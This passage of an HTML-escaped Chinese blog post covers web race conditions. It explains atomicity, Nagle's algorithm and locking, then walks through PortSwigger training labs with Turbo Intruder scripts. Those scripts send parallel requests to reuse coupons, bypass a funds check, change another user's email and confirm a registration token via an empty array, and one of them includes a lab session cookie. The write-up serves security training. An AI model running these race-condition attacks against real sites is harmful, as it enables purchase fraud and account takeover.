&lt;&#x2F;span&gt;&lt;span&gt;Detect&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Simultaneous login to two separate accounts &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;same session
&lt;&#x2F;span&gt;&lt;span&gt;Exploit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Force anon session cookie on victim, then log &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;simultaneously
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;related-knowledge&quot;&gt;Related Knowledge&lt;&#x2F;h1&gt;
&lt;p&gt;文中提到的、以及与竞争密切相关的几个知识点。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;atomic-operation&quot;&gt;Atomic operation&lt;&#x2F;h2&gt;
&lt;p&gt;如果这个操作所处的层(layer)的更高层不能发现其内部实现与结构，那么这个操作是一个&lt;strong&gt;原子(atomic)操作&lt;&#x2F;strong&gt;&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#6&quot;&gt;7&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;。原子操作可以是一个步骤，也可以是多个操作步骤，但是其顺序不可以被打乱，也不可以被切割而只执行其中的一部分。&lt;strong&gt;将整个操作视作一个整体&lt;&#x2F;strong&gt;是原子性的核心特征。&lt;&#x2F;p&gt;
&lt;p&gt;在多进程（线程）访问共享资源时，能够确保&lt;strong&gt;所有其他的进程（线程）&lt;strong&gt;都不在同一时间内访问相同的资源。原子操作（atomic operation）是不需要&lt;&#x2F;strong&gt;synchronized&lt;&#x2F;strong&gt;，不会被线程调度机制打断的操作；这种操作一旦开始，就一直运行到结束，中间不会有任何 context switch（上下文切换，指切换到另一个线程）&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#7&quot;&gt;8&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;HTTP 请求&lt;&#x2F;strong&gt;处理不是&lt;strong&gt;原子&lt;&#x2F;strong&gt;的——任何端点都可能通过不可见的子状态发送应用程序。这意味着在&lt;strong&gt;竞争态势&lt;&#x2F;strong&gt;下，一切都是多步骤的。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;nagle-s-algorithm&quot;&gt;Nagle’s algorithm&lt;&#x2F;h2&gt;
&lt;p&gt;约翰·纳格的文件描述了他所谓的“小数据包问题”－某个应用程序不断地提交小单位的资料，且某些常只占1 byte大小。而由于数据包具有40 bytes 的标头信息（TCP与IPv4各占20字节），这导致了41 bytes 大小的数据包只有 1 byte 的可用信息，造成庞大的浪费。这种状况常常发生于 Telnet 工作阶段－大部分的键盘操作会产生1字节的资料并马上提交。更糟的是，在慢速的网络连线下，这类的数据包会大量地在同一时点传输，造成壅塞碰撞。&lt;&#x2F;p&gt;
&lt;p&gt;纳格算法的工作方式是合并（coalescing）一定数量的输出资料后一次提交。特别的是，只要有已提交的数据包尚未确认，发送者会持续缓冲数据包，直到累积一定数量的资料才提交。&lt;&#x2F;p&gt;
&lt;p&gt;TCP 实现通常为应用程序提供一个接口来禁用 Nagle 算法。在Windows中，在注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters 下新建一个名为 TcpAckFrequency 的 DWORD，使其值为0即可禁用 Nagle 算法。&lt;&#x2F;p&gt;
&lt;p&gt;在末字节同步攻击手段的结束帧发送就应用了内格尔算法对最后帧的批处理。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;locking&quot;&gt;Locking&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;optimistic-locking&quot;&gt;Optimistic Locking&lt;&#x2F;h3&gt;
&lt;p&gt;乐观锁常见的有版本号和CAS算法两种机制&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#8&quot;&gt;9&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;。&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;版本号机制一般是在数据表中加上一个数据版本号version字段，表示数据被修改的次数，当数据被修改时，version值会加一。当线程A要更新数据值时，在读取数据的同时也会读取version值，在提交更新时，若刚才读取到的version值为当前数据库中的version值相等时才更新，否则重试更新操作，直到更新成功。&lt;del&gt;&lt;em&gt;个人感觉相当于使用一个数据来保护另一个，并不能很好起到保护效果&lt;&#x2F;em&gt;&lt;&#x2F;del&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;即&lt;strong&gt;compare and swap（比较与交换）&lt;&#x2F;strong&gt;，是一种有名的&lt;strong&gt;无锁算法&lt;&#x2F;strong&gt;。无锁编程，即不使用锁的情况下实现多线程之间的变量同步，也就是在没有线程被阻塞的情况下实现变量的同步，所以也叫非阻塞同步（Non-blocking Synchronization）。&lt;strong&gt;CAS算法&lt;&#x2F;strong&gt;涉及到三个操作数&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;需要读写的内存值 V&lt;&#x2F;li&gt;
&lt;li&gt;进行比较的值 A&lt;&#x2F;li&gt;
&lt;li&gt;拟写入的新值 B&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;当且仅当 V 的值等于 A时，CAS通过原子方式用新值B来更新V的值，否则不会执行任何操作（比较和替换是一个原子操作）。一般情况下是一个&lt;strong&gt;自旋操作&lt;&#x2F;strong&gt;，即&lt;strong&gt;不断的重试&lt;&#x2F;strong&gt;。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;pessimistic-locking&quot;&gt;Pessimistic Locking&lt;&#x2F;h3&gt;
&lt;p&gt;总是假设最坏的情况，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会阻塞直到它拿到锁（&lt;strong&gt;共享资源每次只给一个线程使用，其它线程阻塞，用完后再把资源转让给其它线程&lt;&#x2F;strong&gt;）。传统的关系型数据库里边就用到了很多这种锁机制，比如行锁，表锁等，读锁，写锁等，都是在做操作之前先上锁。Java中&lt;code&gt;synchronized&lt;&#x2F;code&gt;和&lt;code&gt;ReentrantLock&lt;&#x2F;code&gt;等独占锁就是悲观锁思想的实现。&lt;&#x2F;p&gt;
&lt;p&gt;悲观锁是最激进的保护方式，会很大程度影响并发下的吞吐量。&lt;&#x2F;p&gt;
&lt;h1 id=&quot;metioned-practice-writeup&quot;&gt;Metioned Practice Writeup&lt;&#x2F;h1&gt;
&lt;blockquote&gt;
&lt;p&gt;paper中提到的web-security-lab。下面完成并记录了部分过程&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;lab-limit-overrun-race-conditions&quot;&gt;Lab: Limit overrun race conditions&lt;&#x2F;h2&gt;
&lt;p&gt;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;race-conditions&#x2F;lab-race-conditions-limit-overrun&lt;&#x2F;p&gt;
&lt;p&gt;&lt;del&gt;&lt;em&gt;先下个community burp 2023.9&lt;&#x2F;em&gt;&lt;&#x2F;del&gt;&lt;&#x2F;p&gt;
&lt;p&gt;先买个最便宜的商品，简单测试下功能&lt;&#x2F;p&gt;
&lt;p&gt;![image-20230813210423059](Racing and Smashing the state machine&#x2F;image-20230813210423059-16922686162425.png)&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;GET &#x2F;product&lt;&#x2F;code&gt;查看商品详细信息，&lt;code&gt;POST &#x2F;card&lt;&#x2F;code&gt;将提交表单中的商品添加到 cart，&lt;code&gt;GET &#x2F;cart&lt;&#x2F;code&gt;查看购物车，&lt;code&gt;POST &#x2F;cart&#x2F;coupon&lt;&#x2F;code&gt;应用优惠券，&lt;code&gt;POST &#x2F;cart&#x2F;checkout&lt;&#x2F;code&gt;完成购买动作然后303跳转到&lt;code&gt;GET &#x2F;cart&#x2F;order-comfirmation&lt;&#x2F;code&gt;显示购买后信息。&lt;&#x2F;p&gt;
&lt;p&gt;因为主题是&lt;code&gt;single-package-attack&lt;&#x2F;code&gt;，单包攻击，即一次发送多个请求。而该优惠券应用路由可能会造成可能存在的&lt;code&gt;Race Window&lt;&#x2F;code&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;直接采用新版 burpsuite 提供的功能，将&lt;code&gt;POST &#x2F;cart&#x2F;coupon&lt;&#x2F;code&gt;发送到 repeater 19次，合并为一个组，然后调整发送方式，发送即可。（burp的send parallel对于http&#x2F;1.1采用末字节同步技术，http&#x2F;2采用单包攻击技术&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#10&quot;&gt;10&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;）&lt;&#x2F;p&gt;
&lt;img src=&quot;Racing and Smashing the state machine&#x2F;image-20230813213040972-16922669383881.png&quot; alt=&quot;image-20230813213040972&quot; style=&quot;zoom:50%;&quot; &#x2F;&gt;
&lt;p&gt;此时回到&lt;code&gt;GET &#x2F;card&lt;&#x2F;code&gt;界面已经只有$19.25了，此时再购买即可。&lt;&#x2F;p&gt;
&lt;img src=&quot;Racing and Smashing the state machine&#x2F;image-20230813213134092-16922669715043.png&quot; alt=&quot;image-20230813213134092&quot; style=&quot;zoom:33%;&quot; &#x2F;&gt;
&lt;h2 id=&quot;lab-single-endpoint-race-conditions&quot;&gt;Lab: single-endpoint race conditions&lt;&#x2F;h2&gt;
&lt;p&gt;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;race-conditions&#x2F;lab-race-conditions-single-endpoint&lt;&#x2F;p&gt;
&lt;p&gt;目标要把邮箱修改为&lt;code&gt;carlos@ginandjuice.shop&lt;&#x2F;code&gt;，而可以接触的只有&lt;code&gt;@exploit-0afe0072043930a78126f2df0155002a.exploit-server.net&lt;&#x2F;code&gt;下的邮箱。&lt;&#x2F;p&gt;
&lt;p&gt;使用 turbo Intruder 脚本单包攻击二十次&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;queueRequests&lt;&#x2F;span&gt;&lt;span&gt;(target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;wordlists):
&lt;&#x2F;span&gt;&lt;span&gt;    engine &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;RequestEngine&lt;&#x2F;span&gt;&lt;span&gt;(endpoint&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;endpoint&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                           concurrentConnections&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                           engine&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;Engine&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.BURP2
&lt;&#x2F;span&gt;&lt;span&gt;                           )
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        engine&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;queue&lt;&#x2F;span&gt;&lt;span&gt;(target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;req&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(i)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;gate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;race1&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    engine&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;openGate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;race1&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;handleResponse&lt;&#x2F;span&gt;&lt;span&gt;(req&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;interesting):
&lt;&#x2F;span&gt;&lt;span&gt;    table&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(req)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;回到邮箱界面可以明显注意到修改地址和&lt;code&gt;send to&lt;&#x2F;code&gt;地址基本不匹配&lt;&#x2F;p&gt;
&lt;img src=&quot;Racing and Smashing the state machine&#x2F;image-20230817121032403.png&quot; alt=&quot;image-20230817121032403&quot; style=&quot;zoom: 50%;&quot; &#x2F;&gt;
&lt;p&gt;现在仅保留两个报文副本，一个为可接收的邮箱，一个为&lt;code&gt;carlos@ginandjuice.shop&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;多次发送（亲测把&lt;code&gt;carlos@ginandjuice.shop&lt;&#x2F;code&gt;放在后面成功率高。虽然同个TCP但可能还是有微秒级影响）&lt;&#x2F;p&gt;
&lt;p&gt;![image-20230817121740600](Racing and Smashing the state machine&#x2F;image-20230817121740600.png)&lt;&#x2F;p&gt;
&lt;p&gt;验证地址再删除&lt;code&gt;carlos&lt;&#x2F;code&gt;用户就可以了。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;lab-multi-endpoint-race-conditions&quot;&gt;Lab: Multi-endpoint race conditions&lt;&#x2F;h2&gt;
&lt;p&gt;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;race-conditions&#x2F;lab-race-conditions-multi-endpoint&lt;&#x2F;p&gt;
&lt;p&gt;网站整体功能和第一个实验差不多，但是少了coupon多了一个可购买的礼品卡，花$10得到的礼品卡就是一串code，使用后获得$10然后该code销毁失效。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Multi-endpoint&lt;&#x2F;code&gt;是指多步请求的多个结束位置利用，通常是第一个请求比第二个请求更复杂（或触发速率限制），从而在第一个请求&lt;code&gt;endpoint&lt;&#x2F;code&gt;之前的&lt;code&gt;Race Window&lt;&#x2F;code&gt;完成第二个请求的&lt;code&gt;endpoint&lt;&#x2F;code&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;在Repeater里，将&lt;code&gt;POST &#x2F;card&lt;&#x2F;code&gt;和&lt;code&gt;POST &#x2F;card&#x2F;checkout&lt;&#x2F;code&gt;添加到一个新组中，然后通过单个连接按序列发送，对比响应时间。&lt;&#x2F;p&gt;
&lt;p&gt;然后再将&lt;code&gt;GET &#x2F;&lt;&#x2F;code&gt;添加到该组开头，继续通过单个连接按序列发送，对比响应时间。&lt;&#x2F;p&gt;
&lt;img src=&quot;Racing and Smashing the state machine&#x2F;image-20230813233044992-16922671326167.png&quot; alt=&quot;image-20230813233044992&quot; style=&quot;zoom:50%;&quot; &#x2F;&gt;
&lt;p&gt;PortSwigger 的教程指出这里两次测试下的&lt;code&gt;POST &#x2F;card&lt;&#x2F;code&gt;的响应时间要明显长于&lt;code&gt;POST &#x2F;card&#x2F;checkout&lt;&#x2F;code&gt;。可能是我的网络环境问题导致并不明显，或者需要更直观的数据体现。&lt;&#x2F;p&gt;
&lt;p&gt;添加目标修改&lt;code&gt;POST &#x2F;card&lt;&#x2F;code&gt;的 productId 为1，通过 http&#x2F;2 单包发送。这里可能由于一些干扰因素，需要多次尝试，提示&lt;code&gt;insufficient funds&lt;&#x2F;code&gt;就先移除jacket，换成一张card。&lt;&#x2F;p&gt;
&lt;p&gt;![image-20230813233159601](Racing and Smashing the state machine&#x2F;image-20230813233159601-16922670750615.png)&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;很明显是绕过的&lt;code&gt;&#x2F;card&#x2F;checkout&lt;&#x2F;code&gt;路由下的资金是否充裕检测直接结账 导致后续资金为负数&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;lab-partial-construction-race-conditions&quot;&gt;Lab: Partial construction race conditions&lt;&#x2F;h2&gt;
&lt;p&gt;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;race-conditions&#x2F;lab-race-conditions-partial-construction&lt;&#x2F;p&gt;
&lt;p&gt;部分构造攻击&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#11&quot;&gt;11&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;是针对数据结构层面的利用，即在状态机改变过程中留下一个&lt;code&gt;race window&lt;&#x2F;code&gt;。例如 JSON 数据设定过程中留下了&lt;code&gt;undefined&lt;&#x2F;code&gt;或&lt;code&gt;null&lt;&#x2F;code&gt;的状态，PHP array 创建过程中留下了空数组。由于自定义客户端的处理不一，可能会对该中间状态做出不同的解释。&lt;&#x2F;p&gt;
&lt;p&gt;题目目标是利用不存在的邮箱注册账号，并赋有&lt;code&gt;&#x2F;email&lt;&#x2F;code&gt;的邮箱客户端。提交注册请求，查看浏览器 DevTools &amp;gt; Network 可以看到资源&lt;code&gt;&#x2F;resources&#x2F;static&#x2F;users.js&lt;&#x2F;code&gt;被加载，并泄露确认链接形似&lt;code&gt;&#x2F;comfirm?token=&lt;&#x2F;code&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;考虑服务端在保存token时存在部分构造状态。通过修改token进行测试：提交&lt;code&gt;&#x2F;confirm?token=1&lt;&#x2F;code&gt;返回 “Incorrect token: 1”；提交&lt;code&gt;&#x2F;confirm?token[]=&lt;&#x2F;code&gt;返回 “Incorrect token: Array”，由此可以确认服务端框架解析&lt;code&gt;token[]=&lt;&#x2F;code&gt;为空数组。现使用空数组匹配部分构造状态。（这里的单包初步测试出现了协议不一致的问题，直接修改再反复点击刷新为http&#x2F;2）&lt;&#x2F;p&gt;
&lt;p&gt;为了避免错过短暂的&lt;code&gt;race window&lt;&#x2F;code&gt;，使用&lt;code&gt;turbo Intruder(Extension)&lt;&#x2F;code&gt;并发大量请求。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;queueRequests&lt;&#x2F;span&gt;&lt;span&gt;(target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;wordlists):
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    engine &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;RequestEngine&lt;&#x2F;span&gt;&lt;span&gt;(endpoint&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;endpoint&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                                concurrentConnections&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                                engine&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;Engine&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.BURP2
&lt;&#x2F;span&gt;&lt;span&gt;                                )
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    confirmationReq &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;#39;&amp;#39;POST &#x2F;confirm?token[]= HTTP&#x2F;2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Host: 0aae00b1046ded96810f3f720043001b.web-security-academy.net
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Cookie: phpsessionid=iDVi7uegZUoLuFLuHslvxFHWwi0buIxL
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Content-Length: 0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;attempt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        currentAttempt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= str&lt;&#x2F;span&gt;&lt;span&gt;(attempt)
&lt;&#x2F;span&gt;&lt;span&gt;        username &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;U0er&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;currentAttempt
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# queue a single registration request
&lt;&#x2F;span&gt;&lt;span&gt;        engine&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;queue&lt;&#x2F;span&gt;&lt;span&gt;(target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;req&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;username&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;gate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;currentAttempt)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# queue 50 confirmation requests - note that this will probably sent in two separate packets
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;            engine&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;queue&lt;&#x2F;span&gt;&lt;span&gt;(confirmationReq&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;gate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;currentAttempt)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# send all the queued requests for this attempt
&lt;&#x2F;span&gt;&lt;span&gt;        engine&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;openGate&lt;&#x2F;span&gt;&lt;span&gt;(currentAttempt)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;handleResponse&lt;&#x2F;span&gt;&lt;span&gt;(req&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;interesting):
&lt;&#x2F;span&gt;&lt;span&gt;    table&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(req)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;找到&lt;code&gt;&#x2F;confirm&lt;&#x2F;code&gt;返回的200响应，登录。然后删除carlos用户即可完成。&lt;&#x2F;p&gt;
&lt;p&gt;![image-20230814214830252](Racing and Smashing the state machine&#x2F;image-20230814214830252-16922686162426.png)&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;u1s1 partial construction 实际上也是multi-endpoint的一种&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;webrtc-research&quot;&gt;WebRTC Research&lt;&#x2F;h1&gt;
&lt;p&gt;https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2021&#x2F;01&#x2F;the-state-of-state-machines.html&lt;&#x2F;p&gt;
&lt;h1 id=&quot;quote-link&quot;&gt;Quote Link&lt;&#x2F;h1&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;1&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;1&lt;&#x2F;sup&gt;
